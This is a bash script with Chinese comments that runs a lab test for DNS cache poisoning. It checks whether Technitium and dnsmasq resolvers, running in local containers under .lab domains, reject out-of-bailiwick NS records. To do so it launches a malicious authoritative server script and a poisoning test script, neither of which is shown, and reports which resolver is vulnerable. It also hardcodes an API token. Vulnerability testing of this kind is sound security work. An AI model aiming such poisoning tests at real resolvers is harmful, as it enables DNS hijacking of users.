#!/bin/bash
#
# DNS Authority-NS-RDATA 缓存投毒 — 一键完整测试
#
# 测试 Technitium 和 dnsmasq 是否正确执行 bailiwick check：
# 当合法 attacker.lab 权威服务器在响应中夹带 victim.lab 的恶意 NS 记录时，
# 解析器是否会拒绝缓存这些 out-of-bailiwick 的 NS 记录。
#

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TOKEN="43ba1641d67c84d0e3bc3b1308a40efad0fb404e4cbd96a4a6ddf23db36f113c"
MALICIOUS_PID=""

cleanup() {
    if [ -n "$MALICIOUS_PID" ] && kill -0 "$MALICIOUS_PID" 2>/dev/null; then
        echo -e "\n${CYAN}[清理] 停止恶意权威服务器 (PID $MALICIOUS_PID)${NC}"
        kill "$MALICIOUS_PID" 2>/dev/null
        wait "$MALICIOUS_PID" 2>/dev/null
    fi
}
trap cleanup EXIT

echo -e "${CYAN}============================================================${NC}"
echo -e "${CYAN} DNS Authority-NS-RDATA 缓存投毒 — 完整测试${NC}"
echo -e "${CYAN} 测试目标: bailiwick check (CVE-2025-11411 同类漏洞)${NC}"
echo -e "${CYAN}============================================================${NC}"

# ── Step 0: 前置检查 ──
echo -e "\n${YELLOW}[准备] 检查环境...${NC}"

if ! docker ps --format '{{.Names}}' | grep -q "^bind9$"; then
    echo -e "${RED}[错误] bind9 容器未运行${NC}"; exit 1
fi
if ! docker ps --format '{{.Names}}' | grep -q "^technitium$"; then
    echo -e "${RED}[错误] technitium 容器未运行${NC}"; exit 1
fi
if ! docker ps --format '{{.Names}}' | grep -q "^dnsmasq$"; then
    echo -e "${RED}[错误] dnsmasq 容器未运行${NC}"; exit 1
fi
echo -e "  ✓ 所有容器运行中"

python3 -c "import dns.message" 2>/dev/null || { echo -e "${RED}[错误] dnspython 未安装${NC}"; exit 1; }
echo -e "  ✓ dnspython 可用"

# ── Step 1: 启动恶意权威服务器 ──
echo -e "\n${YELLOW}[Step 1] 启动恶意权威服务器 (端口 9953)...${NC}"
python3 "$SCRIPT_DIR/malicious_auth_server.py" --port 9953 &
MALICIOUS_PID=$!
sleep 2

if ! kill -0 "$MALICIOUS_PID" 2>/dev/null; then
    echo -e "${RED}[错误] 恶意服务器启动失败${NC}"
    exit 1
fi
echo -e "  ✓ 恶意权威服务器已启动 (PID $MALICIOUS_PID)"

# ── Step 2: 清除缓存 ──
echo -e "\n${YELLOW}[Step 2] 清除目标解析器缓存...${NC}"
curl -s "http://localhost:5380/api/cache/flush?token=$TOKEN" > /dev/null 2>&1
echo -e "  ✓ Technitium 缓存已清除"
docker restart dnsmasq > /dev/null 2>&1
sleep 2
echo -e "  ✓ dnsmasq 已重启（缓存清除）"

# ── Step 3: 快速连通性检查 ──
echo -e "\n${YELLOW}[Step 3] 连通性检查...${NC}"
RESULT=$(dig @127.0.0.1 -p 5320 www.victim.lab A +short +timeout=5 2>/dev/null)
if [ "$RESULT" = "1.2.3.4" ]; then
    echo -e "  ✓ Technitium → www.victim.lab = $RESULT"
else
    echo -e "  ${RED}✗ Technitium → www.victim.lab = $RESULT (期望 1.2.3.4)${NC}"
fi

RESULT=$(dig @127.0.0.1 -p 5322 www.victim.lab A +short +timeout=5 2>/dev/null)
if [ "$RESULT" = "1.2.3.4" ]; then
    echo -e "  ✓ dnsmasq → www.victim.lab = $RESULT"
else
    echo -e "  ${RED}✗ dnsmasq → www.victim.lab = $RESULT (期望 1.2.3.4)${NC}"
fi

# ── Step 4: 测试 Technitium ──
echo -e "\n${YELLOW}[Step 4] 测试 Technitium (端口 5320)...${NC}"
TECH_RESULT=0
python3 "$SCRIPT_DIR/test_cache_poison.py" \
    --target-ip 127.0.0.1 --target-port 5320 --target-name "Technitium" \
    --wait 3 || TECH_RESULT=$?

# 清除 Technitium 缓存，避免影响后续
curl -s "http://localhost:5380/api/cache/flush?token=$TOKEN" > /dev/null 2>&1

# ── Step 5: 测试 dnsmasq ──
echo -e "\n${YELLOW}[Step 5] 测试 dnsmasq (端口 5322)...${NC}"

docker restart dnsmasq > /dev/null 2>&1
sleep 2

DNSMASQ_RESULT=0
python3 "$SCRIPT_DIR/test_cache_poison.py" \
    --target-ip 127.0.0.1 --target-port 5322 --target-name "dnsmasq" \
    --wait 3 || DNSMASQ_RESULT=$?

# ── 汇总 ──
echo -e "\n${CYAN}============================================================${NC}"
echo -e "${CYAN} 测试结果汇总${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""
if [ $TECH_RESULT -ne 0 ]; then
    echo -e "  Technitium v14.3:  ${RED}⚠ VULNERABLE${NC}"
else
    echo -e "  Technitium v14.3:  ${GREEN}✓ NOT VULNERABLE${NC}"
fi

if [ $DNSMASQ_RESULT -ne 0 ]; then
    echo -e "  dnsmasq v2.91:     ${RED}⚠ VULNERABLE${NC}"
else
    echo -e "  dnsmasq v2.91:     ${GREEN}✓ NOT VULNERABLE${NC}"
fi
echo ""
echo -e "${CYAN}============================================================${NC}"
